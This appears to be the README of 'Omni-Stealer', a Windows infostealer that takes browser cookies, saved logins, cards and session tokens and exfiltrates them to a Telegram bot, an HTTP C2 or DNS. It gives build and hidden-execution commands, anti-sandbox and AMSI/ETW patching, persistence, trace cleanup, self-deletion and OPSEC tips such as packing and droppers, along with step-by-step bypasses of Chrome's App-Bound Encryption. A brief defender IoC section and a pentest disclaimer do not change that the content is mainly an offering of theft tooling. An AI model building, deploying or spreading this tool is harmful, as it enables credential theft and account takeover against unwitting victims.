# OMNI-STEALER
Chrome Cookie Steale-Extracts Chrome cookies and sends them to your Telegram bot as a formatted file.

# Requirements
Development Machine
OS: Windows 10/11 x64 (cross-compilation not supported)
Python: 3.10+
Compiler: Microsoft Visual C++ Redistributable (for PyInstaller)
Disk: 500 MB+ free for PyInstaller build cache
Target Machine
OS: Windows 10/11 x64 (x86 compatibility untested)
Browsers: Chrome 80+, Edge 80+, or Chromium derivatives
No admin required for most features (Registry policy disable requires admin)
Installation
powershell



# Clone or download the script
# Install Python dependencies
pip install pywin32 cryptography pyinstaller comtypes

# Verify installation
python -c "import win32crypt; print('win32crypt OK')"
python -c "from cryptography.hazmat.primitives.ciphers.aead import AESGCM; print('AESGCM OK')"
python -c "import comtypes; print('comtypes OK')"
pyinstaller --version
Usage
Interactive Build
powershell



python omni_stealer_v4.py
You will be prompted for:

Telegram Bot Token — Create via @BotFather on Telegram
Telegram Chat ID — Get via @userinfobot on Telegram
The tool will*

Test the Telegram connection
Build the standalone executable (ApexStealer.exe)
Place it in the current directory
Command-Line Build
powershell



python omni_stealer_v4.py "<BOT_TOKEN>" "<CHAT_ID>" [<C2_URL>]
Environment Variables (Alternative)
powershell



set TELEGRAM_BOT_TOKEN=your_token_here
set TELEGRAM_CHAT_ID=your_chat_id_here
set C2_SERVER_URL=https://your-c2-server.com/api/collect
set DNS_C2_DOMAIN=exfil.your-domain.com
python omni_stealer_v4.py
Deployment
Copy ApexStealer.exe to the target Windows machine and execute:

powershell



# Normal execution (console window briefly appears)
.\ApexStealer.exe

# Silent execution (no window)
Start-Process -WindowStyle Hidden -FilePath .\ApexStealer.exe
The payload will:

Perform anti-analysis checks (exit if sandbox/debugger detected)
Apply AMSI/ETW patches
Jitter execution (0-5 seconds random delay)
Extract data from all detected browsers
Exfiltrate via Telegram (and optional C2 channels)
Clean up forensic traces
Self-delete
Build Options
Configuration Constants (edit omni_stealer_v4.py before build)


Constant	Default	Description
OUTPUT_EXE_NAME	ApexStealer.exe	Name of the compiled executable
USE_PYINSTALLER	True	Whether to compile with PyInstaller
SANDBOX_CHECK	True	Enable anti-sandbox checks
VM_CHECK	True	Enable VM detection
DEBUGGER_CHECK	True	Enable debugger detection
MAX_SLEEP_JITTER	5	Maximum random delay (seconds) before execution
PyInstaller Flags
The builder uses*

--onefile — Single executable output
--noconsole — No console window on execution
--hidden-import — Required modules explicitly included
--add-data — win32 DLLs bundled
Operational Security
Recommended OPSEC
Use a disposable Telegram bot — Create a new bot via @BotFather for each operation
Avoid public C2 endpoints — Self-hosted HTTPS C2 preferred
Set DNS exfiltration domain in advance — Ensure the NS resolves before operation
Strip metadata — Remove build timestamps and paths from the EXE
Pack/compress — Use UPX or similar packer to reduce detection surface
Stage deployment — Use a dropper if delivering over network boundaries
What to Expect on Target
Network: Outbound HTTPS to api.telegram.org (port 443) — blends with normal traffic
Process: One-shot execution, no lingering processes
Registry: Temporary persistence keys (optional)
Filesystem: Temp files created and cleaned during execution
Indicators of Compromise (for blue teams)
See Detection & Mitigation section below.

Detection & Mitigation (for Defenders)
IoCs
Network:

Outbound connections to api.telegram.org from non-browser processes
HTTP POST with multipart/form-data containing .txt or .json files
Connections to 127.0.0.1:9222 or adjacent ports during browser execution
DNS queries with long hex subdomain labels (DNS exfiltration pattern)
Process:

chrome.exe or msedge.exe spawned with --headless --remote-debugging-port flags
Unusual command-line arguments on browser processes
pyinstaller-packed binaries (detectable by PyInstaller entropy signature)
File System:

SQLite database copies with .tmp suffix in browser profile directories
Temp directories named omni_* or _MEI* (PyInstaller extraction artifacts)
Registry:

HKCU\Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled = 0
HKCU\Software\Policies\Microsoft\Edge\ApplicationBoundEncryptionEnabled = 0
Mitigations


Layer	Control
EDR*	Monitor for --remote-debugging-port flag on browser processes
Network*	Block api.telegram.org for non-browser processes
Browser	Enforce group policy ApplicationBoundEncryptionEnabled = 1
OS	Restrict who can run unsigned executables via AppLocker/ WDAC
Chrome	Chrome 136+ requires --user-data-dir alongside debugging flags
User Training*	Educate on phishing that delivers EXE payloads
Technical Deep Dive
App-Bound Encryption (ABE) — How It Works
Introduced in Chrome 127, ABE ties the encryption key to the browser process itself via the Google Chrome Elevation Service:

The app_bound_encrypted_key in Local State is wrapped with DPAPI under the SYSTEM account
When Chrome needs to decrypt this key, it calls IElevator::DecryptData via COM
The Elevation Service validates the caller's executable path (must be in Chrome's install directory)
On validation success, it unwraps the DPAPI layers and returns the 32-byte AES key
Chrome then uses this AES key to decrypt individual cookie values
Bypass #1: CDP Remote Debugging
Rather than extracting the key, this technique asks Chrome itself to decrypt the data:




1. Spawn chrome.exe --headless --remote-debugging-port=XXXX --user-data-dir=CUSTOM
2. Connect to http://127.0.0.1:XXXX/json → get WebSocket URL
3. Send CDP command: {"method": "Network.getAllCookies"}
4. Receive already-decrypted cookies
The browser has legitimate access to the key via its own Elevation Service context, so this returns plaintext cookies.

Bypass #2: COM IElevator DecryptData
This technique directly calls the Elevation Service COM interface:




1. Locate the app_bound_encrypted_key from Local State
2. CoCreateInstance(CLSID_Elevator) for the specific browser
3. Call IElevator::DecryptData(encoded_blob)
4. Receive the unwrapped 32-byte AES key
5. Decrypt cookies from SQLite directly
The path validation check is bypassed if the calling binary resides in the browser's installation directory, or through DLL injection into a legitimate browser process.

Bypass #3: Registry Policy Disable
Chrome supports an enterprise policy to disable ABE entirely:




HKCU\Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled = DWORD(0)
After setting this registry value and restarting Chrome, cookies are encrypted with v11 (AES-GCM) instead of v20, allowing standard DPAPI+AES-GCM decryption. Requires admin privileges for the machine-wide policy path.

Browser Data Locations Reference


Browser	Local State	Cookie DB	Login Data
Chrome	%LOCALAPPDATA%\Google\Chrome\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
Edge	%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
Brave	%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
Vivaldi	%LOCALAPPDATA%\Vivaldi\User Data\Local State	...\Default\Network\Cookies	...\Default\Login Data
Opera	%APPDATA%\Opera Software\Opera Stable\Local State	...\Network\Cookies	...\Login Data
Opera GX	%APPDATA%\Opera Software\Opera GX Stable\Local State	...\Network\Cookies	...\Login Data
Changelog
v4.0 — APEX Edition (Current)
Complete rewrite with clean architecture
Three ABE v20 bypass techniques (CDP, COM, Registry)
Anti-sandbox, anti-debug, anti-VM (10 checks*
AMSI + ETW patching
Credit card and autofill extraction
Discord token extraction
Session token hunting (AWS, GitHub, JWT, SSH, etc.)
HTTP C2 and DNS exfiltration channels
3-method persistence (Registry, Task Scheduler, Startup)
Full forensic cleanup (logs, prefetch, jumplists, MRU)
PowerShell self-deletion
Multi-profile support for all browsers
v3.0 (Original)
Basic DPAPI + AES-GCM extraction
Telegram exfiltration
Chrome, Edge, Opera support
Single-profile extraction
License & Disclaimer



MIT License

Copyright (c) 2024-2026 Omni-Stealer Project

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
This tool is for authorized penetration testing and security research only.
The developers assume no liability for misuse. Users are responsible for compliance with all applicable laws and regulations. Unauthorized access to computer systems is illegal.
